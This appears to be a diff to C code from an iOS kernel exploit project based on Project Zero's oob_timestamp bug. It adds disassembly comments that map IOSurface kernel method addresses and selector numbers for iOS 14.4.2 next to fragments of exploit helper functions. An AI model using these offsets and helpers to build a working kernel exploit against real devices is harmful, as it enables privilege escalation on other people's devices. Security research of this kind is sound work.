@@ -39,7 +39,8 @@ uint32_t iosurface_s_create_surface_fast_path(void)
     // Brandon Azad's definitions (iosurface.c in oob_timestamp-pac.zip) from https://bugs.chromium.org/p/project-zero/issues/detail?id=1986#c4
     //
     // Estimated struct src: /Library/Developer/KDKs/KDK_13.0_22A380.kdk/System/Library/Extensions/IOSurface.kext
-    // sub_FFFFFFF005FEFFA8 6s 14.4.2; 0xf60, 0x18 struct hint
+    // sub_FFFFFFF008422230 8 14.4.2; 0xf60, 0x18 struct hint
+    // com.apple.iokit.IOSurface:__text:FFFFFFF008422230                         __ZN15IOSurfaceClient13getLockResultEP19IOSurfaceLockResult
     //
     // https://gist.github.com/jmpews/01b520993a742f72714cd06e40793eed
 
@@ -94,6 +95,13 @@ uint32_t iosurface_s_create_surface_fast_path(void)
     return lock_result.surface_id;
 }
 
+//__DATA_CONST:__const:FFFFFFF007866D28 80 63 42 08 F0 FF FF FF __ZN23IOSurfaceRootUserClient12sMethodDescsE DCQ __ZN23IOSurfaceRootUserClient16s_create_surfaceEPS_PvP25IOExternalMethodArguments
+//0xFFFFFFF007866D28 + 0x18 * 8 = FFFFFFF007866DE8; IOConnectCallMethod's selector is 8.
+//__DATA_CONST:__const:FFFFFFF007866DE8 DC 64 42 08 F0 FF FF FF                 DCQ __ZN23IOSurfaceRootUserClient17s_get_ycbcrmatrixEPS_PvP25IOExternalMethodArguments
+//
+// com.apple.iokit.IOSurface:__text:FFFFFFF0084264DC                         ; __int64 __fastcall IOSurfaceRootUserClient::s_get_ycbcrmatrix(IOSurfaceRootUserClient *, __int64, __int64)
+// com.apple.iokit.IOSurface:__text:FFFFFFF0084264DC                         __ZN23IOSurfaceRootUserClient17s_get_ycbcrmatrixEPS_PvP25IOExternalMethodArguments
+
 uint32_t iosurface_s_get_ycbcrmatrix(void)
 {
     uint64_t i_scalar[1] = { 1 }; // fixed, first valid client obj
@@ -115,6 +123,12 @@ uint32_t iosurface_s_get_ycbcrmatrix(void)
     return (uint32_t)o_scalar[0];
 }
 
+//__DATA_CONST:__const:FFFFFFF007866D28 80 63 42 08 F0 FF FF FF __ZN23IOSurfaceRootUserClient12sMethodDescsE DCQ __ZN23IOSurfaceRootUserClient16s_create_surfaceEPS_PvP25IOExternalMethodArguments
+//0xFFFFFFF007866D28 + 0x18 * 33 = FFFFFFF007867040; IOConnectCallMethod's selector is 33.
+//__DATA_CONST:__const:FFFFFFF007867040 44 6E 42 08 F0 FF FF FF                 DCQ __ZN23IOSurfaceRootUserClient23s_set_indexed_timestampEPS_PvP25IOExternalMethodArguments ; IOSurfaceRootUserClient::s_set_indexed_timestamp(IOSurfaceRootUserClient*,void *,IOExternalMethodArguments *)
+//
+// com.apple.iokit.IOSurface:__text:FFFFFFF008426E44                         ; __int64 __fastcall IOSurfaceRootUserClient::s_set_indexed_timestamp(__int64, __int64, __int64)
+// com.apple.iokit.IOSurface:__text:FFFFFFF008426E44                         __ZN23IOSurfaceRootUserClient23s_set_indexed_timestampEPS_PvP25IOExternalMethodArguments
 void iosurface_s_set_indexed_timestamp(uint64_t v)
 {
     uint64_t i_scalar[3] = {
